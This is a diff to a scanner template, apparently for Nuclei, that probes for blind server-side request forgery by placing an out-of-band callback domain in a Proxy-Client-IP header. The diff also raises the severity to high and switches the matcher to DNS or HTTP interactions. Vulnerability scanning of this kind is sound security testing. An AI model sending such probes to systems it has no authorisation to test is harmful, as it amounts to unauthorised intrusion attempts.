@@ -1,16 +1,17 @@
-id: 0x026
+id: blind-ssrf-026
 
 info:
   name: Blind SSRF
-  author: 0xAwali
-  severity: info
+  author: reewardius
+  severity: high
+  tags: ssrf
 
-requests:
+http:
   - raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-        Proxy-Client-IP: {{Host}}.{{Port}}.BSSRF-026.{{MY-DOMAIN}}
+        Proxy-Client-IP: {{Host}}.{{Port}}.BSSRF-026.{{interactsh-url}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
         Cache-Control: no-transform
         Accept-Encoding: gzip, deflate
@@ -18,6 +19,8 @@ requests:
 
     matchers:
       - type: word
-        part: body
+        part: interactsh_protocol
         words:
-          - "Your Match"
+          - "dns"
+          - "http"
+        condition: or
